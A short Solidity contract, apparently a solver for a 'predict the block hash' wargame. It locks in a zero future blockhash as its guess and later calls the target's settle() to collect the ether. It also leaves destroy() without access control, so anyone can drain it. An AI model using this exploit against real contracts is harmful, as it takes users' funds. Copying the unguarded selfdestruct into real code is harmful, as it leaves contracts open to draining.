/**
 *Submitted for verification at Etherscan.io on 2021-10-28
*/

// SPDX-License-Identifier: MIT

pragma solidity >=0.7.0 <0.9.0;

contract PredictTheFutur{
    
    bytes32 myAnswer;
    
    function lockIn(address payable _contract) payable public returns(bool) {
        require(msg.value == 1 ether);
        myAnswer = blockhash(block.number+2);
        (bool success,) = _contract.call{value : msg.value}(
            abi.encodeWithSignature("lockInGuess(bytes32)", myAnswer)
        );
        require(success,"lockIn crash");
        return (success);
    }
    
    function attack(address payable _contract) payable public returns(bool){
        (bool success,) = _contract.call(
            abi.encodeWithSignature("settle()")    
        ); 
        require(success,"attack failed");
        return(success);
    }
    
    function destroy() public {
        selfdestruct(payable(msg.sender));
    }
    
    function getMyAnswer() public view returns(bytes32) {
        return myAnswer;
    }
}